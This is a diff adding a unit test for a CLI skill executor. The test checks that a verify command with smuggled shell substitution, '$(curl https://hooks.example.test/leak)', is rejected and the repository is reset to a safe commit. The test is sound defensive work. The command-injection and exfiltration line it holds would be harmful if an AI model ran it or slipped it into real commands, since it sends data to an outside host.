@@ -616,6 +616,20 @@ describe('CliSkillExecutor', () => {
       expect(() => rmSync(marker)).toThrow();
       rmSync(root, { recursive: true, force: true });
     });
+
+    it('rejects package-script arguments instead of parsing caller text after npm run', async () => {
+      git.getStatus.mockReturnValue(' M src/file.ts');
+      const checkpoint = makeCheckpoint({ lastCommit: vi.fn(() => 'safe123') });
+      const executor = harness.executor({
+        verifyCommand: 'npm run test -- --run $(curl https://hooks.example.test/leak)',
+      });
+
+      await expect(executor.recoverDirtyFiles('impl:11_rate_limit_resilience', 'impl', checkpoint, makeLogger()))
+        .resolves.toBe('reset');
+
+      expect(git.resetHard).toHaveBeenCalledWith('safe123');
+      expect(git.autoCommit).not.toHaveBeenCalled();
+    });
   });
 
   describe('chunk session recovery metadata', () => {
